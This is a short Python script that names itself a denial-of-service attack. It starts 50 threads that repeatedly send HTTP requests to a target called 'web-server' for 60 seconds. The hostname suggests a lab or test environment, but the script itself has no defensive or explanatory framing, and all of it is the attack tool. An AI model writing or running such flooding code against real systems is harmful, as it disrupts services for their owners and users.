#!/usr/bin/env python3

import requests
import threading
import time
import sys

# Target settings
target = "http://web-server"
num_threads = 50
duration = 60  # seconds

def dos_attack():
    while True:
        try:
            response = requests.get(target)
            print(f"Sent request, got response code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(0.1)

print(f"Starting DoS attack against {target} with {num_threads} threads for {duration} seconds")

# Start threads
threads = []
for i in range(num_threads):
    t = threading.Thread(target=dos_attack)
    t.daemon = True
    threads.append(t)
    t.start()
    print(f"Started thread {i+1}")

# Run for specified duration
time.sleep(duration)
print("Attack completed")